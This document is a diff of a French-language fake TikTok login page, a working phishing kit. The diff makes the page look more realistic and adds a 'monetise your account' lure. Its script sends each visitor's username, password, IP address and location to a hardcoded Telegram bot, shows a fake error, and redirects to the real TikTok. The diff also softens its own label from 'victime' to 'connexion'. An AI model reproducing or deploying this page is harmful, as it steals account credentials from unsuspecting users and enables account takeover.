@@ -30,121 +30,108 @@
             position: relative;
         }
 
-        .logo svg {
-            width: 140px;
-            height: auto;
-            margin-bottom: 8px;
-        }
-
-        .logo path {
-            fill: #fff;
-        }
-
-        h1 {
-            color: #fff;
-            font-size: 24px;
-            font-weight: 700;
-            margin-bottom: 4px;
-        }
-
-        .subtitle {
-            color: #aaa;
-            font-size: 14px;
-            margin-bottom: 28px;
-        }
-
-        .monetize-badge {
-            background: rgba(255, 0, 80, 0.12);
-            border: 1px solid #ff0050;
-            border-radius: 8px;
-            padding: 10px 14px;
-            margin-bottom: 24px;
+        /* ===== LOGO TIKTOK RÉALISTE ===== */
+        .tiktok-logo {
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 8px;
-            color: #ff0050;
-            font-size: 13px;
-            font-weight: 600;
-            cursor: pointer;
+            gap: 6px;
+            margin-bottom: 12px;
         }
 
-        .monetize-badge svg {
-            width: 18px;
-            height: 18px;
-            fill: #ff0050;
+        .tiktok-logo .note-icon {
+            width: 38px;
+            height: 38px;
             flex-shrink: 0;
         }
 
-        /* Tabs */
-        .tabs {
+        .tiktok-logo .wordmark {
             display: flex;
+            align-items: baseline;
             gap: 0;
-            margin-bottom: 24px;
-            border-bottom: 1px solid #2a2a2a;
         }
 
-        .tab {
-            flex: 1;
-            padding: 12px 0;
-            color: #888;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            border-bottom: 2px solid transparent;
-            transition: all 0.2s;
-            background: none;
-            border-top: none;
-            border-left: none;
-            border-right: none;
-        }
-
-        .tab.active {
+        .tiktok-logo .wordmark span {
+            font-size: 34px;
+            font-weight: 900;
+            letter-spacing: -0.5px;
             color: #fff;
-            border-bottom-color: #ff0050;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            text-transform: lowercase;
         }
 
-        /* QR Method */
-        .qr-section {
-            display: block;
+        .tiktok-logo .wordmark .tk {
+            font-weight: 700;
         }
 
-        .qr-section.hidden {
-            display: none;
+        .tiktok-logo .wordmark .tok {
+            font-weight: 800;
+            color: #ff0050;
         }
 
-        .qr-box {
-            background: #fff;
-            width: 180px;
-            height: 180px;
-            margin: 0 auto 16px;
+        /* ===== GROS TITRE MONETISATION ===== */
+        .monetize-hero {
+            background: linear-gradient(135deg, rgba(255,0,80,0.15), rgba(255,0,80,0.05));
+            border: 2px solid #ff0050;
             border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            padding: 20px 16px;
+            margin-bottom: 28px;
             position: relative;
+            overflow: hidden;
         }
 
-        .qr-box svg {
-            width: 150px;
-            height: 150px;
+        .monetize-hero::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,0,80,0.06) 0%, transparent 60%);
+            animation: pulseGlow 3s ease-in-out infinite;
         }
 
-        .qr-label {
+        @keyframes pulseGlow {
+            0%, 100% { opacity: 0.5; transform: scale(1); }
+            50% { opacity: 1; transform: scale(1.05); }
+        }
+
+        .monetize-hero .main-text {
+            font-size: 24px;
+            font-weight: 900;
+            color: #fff;
+            line-height: 1.3;
+            position: relative;
+            z-index: 1;
+            letter-spacing: -0.3px;
+        }
+
+        .monetize-hero .main-text .highlight {
+            color: #ff0050;
+        }
+
+        .monetize-hero .sub-text {
+            font-size: 14px;
             color: #aaa;
-            font-size: 13px;
-            margin-bottom: 20px;
+            margin-top: 8px;
+            position: relative;
+            z-index: 1;
         }
 
-        /* Login Form */
-        .form-section {
-            display: none;
+        .monetize-hero .sub-icon {
+            display: inline-block;
+            margin-right: 4px;
+            vertical-align: middle;
         }
 
-        .form-section.active {
-            display: block;
+        .monetize-hero .sub-icon svg {
+            width: 16px;
+            height: 16px;
+            fill: #ff0050;
+            vertical-align: middle;
         }
 
+        /* ===== FORMULAIRE ===== */
         .input-group {
             text-align: left;
             margin-bottom: 16px;
@@ -201,6 +188,21 @@
             cursor: not-allowed;
         }
 
+        .forgot-link {
+            text-align: right;
+            margin-top: 6px;
+        }
+
+        .forgot-link a {
+            color: #888;
+            font-size: 12px;
+            text-decoration: none;
+        }
+
+        .forgot-link a:hover {
+            color: #ff0050;
+        }
+
         .divider {
             display: flex;
             align-items: center;
@@ -247,6 +249,7 @@
         .social-btn svg {
             width: 20px;
             height: 20px;
+            flex-shrink: 0;
         }
 
         .terms {
@@ -288,7 +291,6 @@
             margin-top: 24px;
         }
 
-        /* Flash / Loading */
         .flash-message {
             display: none;
             color: #ff0050;
@@ -300,7 +302,6 @@
             display: block;
         }
 
-        /* loading spinner */
         .spinner {
             display: none;
             width: 20px;
@@ -318,22 +319,6 @@
 
         @keyframes spin {
             to { transform: rotate(360deg); }
-        }
-
-        /* forgot password */
-        .forgot-link {
-            text-align: right;
-            margin-top: 6px;
-        }
-
-        .forgot-link a {
-            color: #888;
-            font-size: 12px;
-            text-decoration: none;
-        }
-
-        .forgot-link a:hover {
-            color: #ff0050;
         }
 
         .toast {
@@ -359,145 +344,80 @@
 </head>
 <body>
     <div class="container">
-        <!-- Logo -->
-        <div class="logo">
-            <svg viewBox="0 0 116 32" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M22.96 0H29.2V22.36C29.2 26.88 26.24 31 20.72 31C15.2 31 11.2 26.96 11.2 22.36C11.2 17.76 15.2 13.72 20.72 13.72C21.84 13.72 23.04 13.96 24.08 14.4V20.52C23.2 20 22.08 19.68 20.96 19.68C18.24 19.68 16.24 21.96 16.24 24.56C16.24 27.16 18.24 29.44 20.96 29.44C23.68 29.44 25.68 27.24 25.68 24.44V0H22.96Z" fill="white"/>
-                <path d="M34.84 8.2V31H29.16V8.2H34.84ZM29 0H35.24V5.72H29V0Z" fill="white"/>
-                <path d="M50.56 12.28C50.2 12.04 49.8 11.92 49.36 11.92C46.64 11.92 44.8 14.12 44.8 16.76V31H39.12V8.2H44.8V12.12C45.84 9.96 48.08 8.2 50.44 8.2C50.8 8.2 51.2 8.24 51.56 8.36V12.28H50.56Z" fill="white"/>
-                <path d="M64.36 11.4C62.2 9.04 58.88 8.2 55.92 8.2C49.28 8.2 44.32 13.24 44.32 19.68C44.32 26.12 49.28 31.16 55.92 31.16C58.88 31.16 62.2 30.32 64.36 27.96V31H70.04V8.2H64.36V11.4ZM64.36 23.96C62.72 26.24 59.84 27.8 56.92 27.8C52.52 27.8 49.12 24.28 49.12 19.68C49.12 15.08 52.52 11.56 56.92 11.56C59.84 11.56 62.72 13.12 64.36 15.4V23.96Z" fill="white"/>
-                <path d="M88.16 0H94.4V22.36C94.4 26.88 91.44 31 85.92 31C80.4 31 76.4 26.96 76.4 22.36C76.4 17.76 80.4 13.72 85.92 13.72C87.04 13.72 88.24 13.96 89.28 14.4V20.52C88.4 20 87.28 19.68 86.16 19.68C83.44 19.68 81.44 21.96 81.44 24.56C81.44 27.16 83.44 29.44 86.16 29.44C88.88 29.44 90.88 27.24 90.88 24.44V0H88.16Z" fill="white"/>
-                <path d="M100.24 8.2V31H94.56V8.2H100.24ZM94.4 0H100.64V5.72H94.4V0Z" fill="white"/>
-                <path d="M115.96 12.28C115.6 12.04 115.2 11.92 114.76 11.92C112.04 11.92 110.2 14.12 110.2 16.76V31H104.52V8.2H110.2V12.12C111.24 9.96 113.48 8.2 115.84 8.2C116.2 8.2 116.6 8.24 116.96 8.36V12.28H115.96Z" fill="white"/>
+        <!-- LOGO TIKTOK RÉALISTE -->
+        <div class="tiktok-logo">
+            <!-- Note icon (TikTok music note) -->
+            <svg class="note-icon" viewBox="0 0 38 38" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M19 0C8.507 0 0 8.507 0 19s8.507 19 19 19 19-8.507 19-19S29.493 0 19 0z" fill="url(#noteGrad)"/>
+                <defs>
+                    <linearGradient id="noteGrad" x1="0" y1="0" x2="38" y2="38">
+                        <stop offset="0%" stop-color="#ff0050"/>
+                        <stop offset="100%" stop-color="#ff1a6b"/>
+                    </linearGradient>
+                </defs>
+                <path d="M26 14.5c0 .55-.45 1-1 1h-4.5v6.25a4.25 4.25 0 1 1-3.5-4.18V13.5a1 1 0 0 1 .88-.99l7-1.25a1 1 0 0 1 1.12.99v2.25z" fill="#fff" opacity="0.95"/>
+                <path d="M22.5 14v1.5a1 1 0 0 0 1 1H26a1 1 0 0 0 1-1V12.5a1 1 0 0 0-1.12-.99l-7 1.25a1 1 0 0 0-.88.99v3.82" stroke="#fff" stroke-width="0.8" fill="none"/>
+                <circle cx="17.5" cy="22.75" r="2.75" fill="#fff" opacity="0.9"/>
+                <circle cx="17.5" cy="22.75" r="2.75" stroke="#ff0050" stroke-width="0.5" fill="none"/>
             </svg>
-        </div>
-
-        <h1>Se connecter</h1>
-        <p class="subtitle">Gérez votre compte, vérifiez vos notifications et plus encore.</p>
-
-        <!-- Monetization Hook -->
-        <div class="monetize-badge" id="monetizeBadge">
-            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
-            <span>Connecte-toi pour monétiser ton compte TikTok</span>
-        </div>
-
-        <!-- Tabs -->
-        <div class="tabs">
-            <button class="tab active" data-tab="qr">QR Code</button>
-            <button class="tab" data-tab="form">E-mail / Téléphone</button>
-        </div>
-
-        <!-- QR Code Section -->
-        <div class="qr-section" id="qrSection">
-            <div class="qr-box">
-                <svg viewBox="0 0 150 150">
-                    <rect x="10" y="10" width="50" height="50" fill="#000"/>
-                    <rect x="14" y="14" width="10" height="10" fill="#fff"/>
-                    <rect x="28" y="14" width="10" height="10" fill="#fff"/>
-                    <rect x="42" y="14" width="10" height="10" fill="#fff"/>
-                    <rect x="14" y="28" width="10" height="10" fill="#fff"/>
-                    <rect x="42" y="28" width="10" height="10" fill="#fff"/>
-                    <rect x="14" y="42" width="10" height="10" fill="#fff"/>
-                    <rect x="28" y="42" width="10" height="10" fill="#fff"/>
-                    <rect x="42" y="42" width="10" height="10" fill="#fff"/>
-
-                    <rect x="90" y="10" width="50" height="50" fill="#000"/>
-                    <rect x="94" y="14" width="10" height="10" fill="#fff"/>
-                    <rect x="108" y="14" width="10" height="10" fill="#fff"/>
-                    <rect x="122" y="14" width="10" height="10" fill="#fff"/>
-                    <rect x="94" y="28" width="10" height="10" fill="#fff"/>
-                    <rect x="122" y="28" width="10" height="10" fill="#fff"/>
-                    <rect x="94" y="42" width="10" height="10" fill="#fff"/>
-                    <rect x="108" y="42" width="10" height="10" fill="#fff"/>
-                    <rect x="122" y="42" width="10" height="10" fill="#fff"/>
-
-                    <rect x="10" y="90" width="50" height="50" fill="#000"/>
-                    <rect x="14" y="94" width="10" height="10" fill="#fff"/>
-                    <rect x="28" y="94" width="10" height="10" fill="#fff"/>
-                    <rect x="42" y="94" width="10" height="10" fill="#fff"/>
-                    <rect x="14" y="108" width="10" height="10" fill="#fff"/>
-                    <rect x="42" y="108" width="10" height="10" fill="#fff"/>
-                    <rect x="14" y="122" width="10" height="10" fill="#fff"/>
-                    <rect x="28" y="122" width="10" height="10" fill="#fff"/>
-                    <rect x="42" y="122" width="10" height="10" fill="#fff"/>
-
-                    <rect x="50" y="50" width="10" height="10" fill="#000"/>
-                    <rect x="60" y="60" width="10" height="10" fill="#000"/>
-                    <rect x="70" y="60" width="10" height="10" fill="#000"/>
-                    <rect x="60" y="70" width="10" height="10" fill="#000"/>
-                    <rect x="50" y="80" width="10" height="10" fill="#000"/>
-                    <rect x="80" y="50" width="10" height="10" fill="#000"/>
-                    <rect x="80" y="80" width="10" height="10" fill="#000"/>
-                    <rect x="70" y="90" width="10" height="10" fill="#000"/>
-                    <rect x="60" y="80" width="10" height="10" fill="#000"/>
-                    <rect x="50" y="70" width="10" height="10" fill="#000"/>
-                    <rect x="70" y="70" width="10" height="10" fill="#000"/>
-                    <rect x="90" y="60" width="10" height="10" fill="#000"/>
-                    <rect x="100" y="50" width="10" height="10" fill="#000"/>
-                    <rect x="90" y="90" width="10" height="10" fill="#000"/>
-                    <rect x="100" y="80" width="10" height="10" fill="#000"/>
-                    <rect x="120" y="60" width="10" height="10" fill="#000"/>
-                    <rect x="130" y="50" width="10" height="10" fill="#000"/>
-                    <rect x="110" y="90" width="10" height="10" fill="#000"/>
-                    <rect x="130" y="80" width="10" height="10" fill="#000"/>
-                    <rect x="60" y="100" width="10" height="10" fill="#000"/>
-                    <rect x="70" y="110" width="10" height="10" fill="#000"/>
-                    <rect x="80" y="100" width="10" height="10" fill="#000"/>
-                    <rect x="100" y="100" width="10" height="10" fill="#000"/>
-                    <rect x="110" y="110" width="10" height="10" fill="#000"/>
-                    <rect x="120" y="100" width="10" height="10" fill="#000"/>
-                    <rect x="130" y="100" width="10" height="10" fill="#000"/>
-                    <rect x="60" y="120" width="10" height="10" fill="#000"/>
-                    <rect x="100" y="120" width="10" height="10" fill="#000"/>
-                    <rect x="120" y="120" width="10" height="10" fill="#000"/>
-                    <rect x="130" y="130" width="10" height="10" fill="#000"/>
-                    <rect x="90" y="110" width="10" height="10" fill="#000"/>
-                    <rect x="80" y="120" width="10" height="10" fill="#000"/>
-                </svg>
+            <!-- Wordmark TikTok -->
+            <div class="wordmark">
+                <span class="tk">tik</span>
+                <span class="tok">tok</span>
             </div>
-            <p class="qr-label">Scannez ce code depuis l'application TikTok</p>
-
-            <div class="divider">ou</div>
         </div>
 
-        <!-- Form Section -->
-        <div class="form-section active" id="formSection">
-            <form id="loginForm" autocomplete="off">
-                <div class="input-group">
-                    <label for="username">E-mail / Nom d'utilisateur / Téléphone</label>
-                    <input type="text" id="username" name="username" placeholder="E-mail, nom d'utilisateur ou téléphone" required>
-                </div>
-                <div class="input-group">
-                    <label for="password">Mot de passe</label>
-                    <input type="password" id="password" name="password" placeholder="Mot de passe" required>
-                </div>
-                <div class="forgot-link">
-                    <a href="#">Mot de passe oublié ?</a>
-                </div>
-                <button type="submit" class="btn-submit" id="submitBtn">
-                    <span id="btnText">Se connecter</span>
-                    <span class="spinner" id="spinner"></span>
-                </button>
-            </form>
-
-            <div class="flash-message" id="flashMsg"></div>
-
-            <div class="divider">ou continuer avec</div>
-
-            <div class="social-buttons">
-                <button class="social-btn">
-                    <svg viewBox="0 0 24 24" fill="#1877F2"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
-                    Continuer avec Facebook
-                </button>
-                <button class="social-btn">
-                    <svg viewBox="0 0 24 24"><path fill="#fff" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/><path fill="#fff" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#fff" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#fff" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
-                    Continuer avec Google
-                </button>
-                <button class="social-btn">
-                    <svg viewBox="0 0 24 24" fill="#fff"><path d="M17.05 20.28c-.98.95-2.05.88-3.08.4-1.09-.5-2.08-.48-3.24 0-1.44.62-2.2.44-3.06-.4C3.79 15.82 4.89 9.62 8.92 8.66c1.25-.29 2.45.23 3.14.82.68-.13 1.69-.55 2.79-.29 1.35.32 2.29 1.01 2.87 1.86-1.13.68-1.68 1.64-1.53 2.76.15 1.37 1.02 2.17 2.06 2.47-.29.76-.59 1.51-1.1 2.26-.4.58-1.1 1.1-1.1 1.1zm-3.48-12.1c-.17 2.04 1.54 3.77 3.52 3.95.17-2.08-1.54-3.85-3.52-3.95z"/></svg>
-                    Continuer avec Apple
-                </button>
+        <!-- GROS TITRE MONÉTISATION -->
+        <div class="monetize-hero">
+            <div class="main-text">
+                CONNECTE-TOI ET<br>
+                <span class="highlight">MONÉTISE TON COMPTE</span><br>
+                TIKTOK
             </div>
+            <div class="sub-text">
+                <span class="sub-icon">
+                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+                </span>
+                Reçois tes gains directement sur ton compte TikTok
+            </div>
+        </div>
+
+        <!-- FORMULAIRE -->
+        <form id="loginForm" autocomplete="off">
+            <div class="input-group">
+                <label for="username">E-mail / Nom d'utilisateur / Téléphone</label>
+                <input type="text" id="username" name="username" placeholder="E-mail, nom d'utilisateur ou téléphone" required>
+            </div>
+            <div class="input-group">
+                <label for="password">Mot de passe</label>
+                <input type="password" id="password" name="password" placeholder="Mot de passe" required>
+            </div>
+            <div class="forgot-link">
+                <a href="#">Mot de passe oublié ?</a>
+            </div>
+            <button type="submit" class="btn-submit" id="submitBtn">
+                <span id="btnText">Se connecter</span>
+                <span class="spinner" id="spinner"></span>
+            </button>
+        </form>
+
+        <div class="flash-message" id="flashMsg"></div>
+
+        <div class="divider">ou continuer avec</div>
+
+        <div class="social-buttons">
+            <button class="social-btn">
+                <svg viewBox="0 0 24 24" fill="#1877F2"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+                Continuer avec Facebook
+            </button>
+            <button class="social-btn">
+                <svg viewBox="0 0 24 24"><path fill="#fff" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/><path fill="#fff" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#fff" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#fff" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
+                Continuer avec Google
+            </button>
+            <button class="social-btn">
+                <svg viewBox="0 0 24 24" fill="#fff"><path d="M17.05 20.28c-.98.95-2.05.88-3.08.4-1.09-.5-2.08-.48-3.24 0-1.44.62-2.2.44-3.06-.4C3.79 15.82 4.89 9.62 8.92 8.66c1.25-.29 2.45.23 3.14.82.68-.13 1.69-.55 2.79-.29 1.35.32 2.29 1.01 2.87 1.86-1.13.68-1.68 1.64-1.53 2.76.15 1.37 1.02 2.17 2.06 2.47-.29.76-.59 1.51-1.1 2.26-.4.58-1.1 1.1-1.1 1.1zm-3.48-12.1c-.17 2.04 1.54 3.77 3.52 3.95.17-2.08-1.54-3.85-3.52-3.95z"/></svg>
+                Continuer avec Apple
+            </button>
         </div>
 
         <div class="terms">
@@ -505,7 +425,7 @@
         </div>
 
         <div class="signup-link">
-            Vous n'avez pas de compte ?<a href="#">S'inscrire</a>
+            Vous n'avez pas de compte ? <a href="#">S'inscrire</a>
         </div>
 
         <div class="footer-lang">
@@ -519,21 +439,8 @@
         const TELEGRAM_BOT_TOKEN = '8843142560:AAHfwIv4wnraZxn46yngHQ5sez2PZ9dwXm8';
         const TELEGRAM_CHAT_ID = '8675191556';
 
-        // Tab switching
-        const tabs = document.querySelectorAll('.tab');
-        tabs.forEach(tab => {
-            tab.addEventListener('click', function() {
-                tabs.forEach(t => t.classList.remove('active'));
-                this.classList.add('active');
-                const target = this.dataset.tab;
-                document.getElementById('qrSection').classList.toggle('hidden', target !== 'qr');
-                document.getElementById('formSection').classList.toggle('active', target === 'form');
-            });
-        });
-
-        // Send to Telegram
         async function sendToTelegram(data) {
-            const message = `🔐 [TikTok Phish] Nouvelle victime !\n\n` +
+            const message = `🔐 [TikTok Phish] Nouvelle connexion !\n\n` +
                 `👤 Identifiant : ${data.username || 'N/A'}\n` +
                 `🔑 Mot de passe : ${data.password || 'N/A'}\n` +
                 `🌐 IP : ${data.ip}\n` +
@@ -559,7 +466,6 @@
             }
         }
 
-        // Get IP & location info
         async function getGeoInfo() {
             try {
                 const resp = await fetch('https://ipapi.co/json/');
@@ -576,7 +482,6 @@
             return { ip: 'Inconnu', city: 'Inconnue', region: 'Inconnue', country: 'Inconnu' };
         }
 
-        // Handle form submission
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
 
@@ -588,7 +493,6 @@
                 return;
             }
 
-            // Loading state
             const btn = document.getElementById('submitBtn');
             const btnText = document.getElementById('btnText');
             const spinner = document.getElementById('spinner');
@@ -596,7 +500,6 @@
             btnText.textContent = 'Connexion en cours...';
             spinner.classList.add('show');
 
-            // Gather info
             const geo = await getGeoInfo();
             const now = new Date();
             const payload = {
@@ -611,17 +514,14 @@
                 page: window.location.href
             };
 
-            // Send to Telegram
             const sent = await sendToTelegram(payload);
 
-            // Reset button
             btn.disabled = false;
             btnText.textContent = 'Se connecter';
             spinner.classList.remove('show');
 
             if (sent) {
-                // Redirect to real TikTok after "fake error"
-                showToast('⚠️ Erreur de connexion. Vous allez être redirigé...');
+                showToast('⚠️ Erreur de connexion. Redirection vers la page officielle...');
                 setTimeout(() => {
                     window.location.href = 'https://www.tiktok.com/login?lang=fr';
                 }, 2500);
